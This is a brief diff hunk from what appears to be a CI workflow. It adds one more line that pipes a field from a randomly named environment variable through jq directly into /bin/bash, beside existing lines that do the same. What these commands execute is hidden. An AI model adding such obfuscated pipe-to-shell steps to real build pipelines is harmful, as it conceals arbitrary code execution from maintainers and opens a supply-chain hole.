@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$qll5" | jq -r .egf8 | /bin/bash
           echo $tiul97 | jq -r .u5 | /bin/bash
           echo $kmxyp1942 | jq -r .tvch431 | /bin/bash
+          printf '%s' "$hrj8" | jq -r .co79 | /bin/bash
 
       - name: Save output
         if: always()
